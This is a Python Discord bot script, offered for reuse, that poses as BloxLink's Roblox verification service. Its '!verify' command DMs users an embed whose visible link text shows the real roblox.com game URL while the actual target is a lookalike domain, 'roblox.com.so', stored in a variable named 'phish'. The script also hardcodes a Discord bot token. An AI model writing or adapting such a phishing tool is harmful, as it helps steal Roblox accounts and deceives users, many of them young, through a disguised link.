'''
Creds to karlo#0001 for coding this. 
Removing these credits will result in a copyright claim

https://discord.gg/notlucid

'''

import discord
from discord.ext import commands
import requests

################### change these to your liking ###################

token = "ODczMzMyODc3NzM0MDU2MDI2.YQ24nw.JPl_Ozgv95-2p52kEU47h8BB_OQ"
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink\'s Official Roblox Verification Game"
field = "🔽 Please Login and join the game 🔽"
hyperlink = "https://roblox.com/games/429530"
phish = "https://roblox.com.so/games/429530"

###################################################################



client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Selfbot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")
main.set_thumbnail(url='https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png')

@client.command()
async def verify(ctx):
    await ctx.send('***Sent Verification Link! Please Check DMs***')
    await ctx.author.send(embed=main)





client.run(token)
